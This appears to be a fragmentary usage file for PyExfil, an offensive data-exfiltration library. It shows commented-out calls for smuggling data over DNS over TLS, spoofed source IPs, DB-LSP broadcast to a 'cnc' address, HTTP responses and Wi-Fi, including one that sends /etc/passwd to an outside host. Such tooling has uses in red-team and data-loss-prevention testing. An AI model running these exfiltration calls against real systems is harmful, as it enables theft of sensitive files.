...
""" DNS Over TLS """
#from pyexfil.comm.dns_over_tls.client import Send
#Send(data="Hal, please open the bay door.", server='1.1.1.1')

#from pyexfil.comm.dns_over_tls.server import StartServer
...
""" Source IP Based * """
#from pyexfil.network.spoof_ip.spoof_ips_client import _send
#
...
#from pyexfil.comm.db_lsp.dblsp import DB_LSP
#
# dbLSP = DB_LSP(
#                     cnc='192.168.1.255',
...
""" Over HTTP Response """
#from pyexfil.network.http_resp.client import Broadcast
# b = Broadcast(
#                 fname="/etc/passwd",
#                 dst_ip="www.espn.com",
#                 dst_port=80,
...
#from pyexfil.physical.wifi_payload.client import exfiltrate
#
